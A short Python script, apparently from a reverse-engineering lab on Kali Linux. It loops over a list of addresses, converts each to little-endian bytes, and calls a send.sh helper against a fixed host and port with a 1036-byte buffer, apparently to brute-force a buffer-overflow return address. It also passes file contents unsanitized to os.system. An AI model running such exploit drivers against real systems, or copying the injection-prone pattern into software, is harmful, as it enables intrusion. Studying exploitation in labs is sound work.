#!/usr/bin/python

#Importando bibliotecas
import sys
import re
import os

#Arquivo com a lista de enderecos
filename="/home/kali/engrev/list.txt"
filecontent= list()

host="172.70.10.101"
port=4000
buff=1036

#================================
#Iniciando o Script

#Validando se Arquivo Existe
if not os.path.isfile(filename):
	print("File not found")

#Abrindo o Arquivo
fileopen = open(filename, "r")

#Percorrendo o arquivo
for line in fileopen:
	#Lendo linha a linha e separando em 2 strings endereco e desc
	array=line.split(" ")

	#Capturando o Endereco
	end=array[0]
	func=array[2]
	#Montando o endereco em LittleIndia
	#\x\x\x\x

	nwend=(r'\x'+end[8]+end[9]+r"\x"+end[6]+end[7]+r"\x"+end[4]+end[5]+r"\x"+end[2]+end[3])

	cmd=os.getcwd()+"/send.sh "+host+" "+str(port)+" "+filename+" "+str(buff)+" "+"'"+str(nwend)+"' "+str(func)

	os.system(cmd)

fileopen.close()
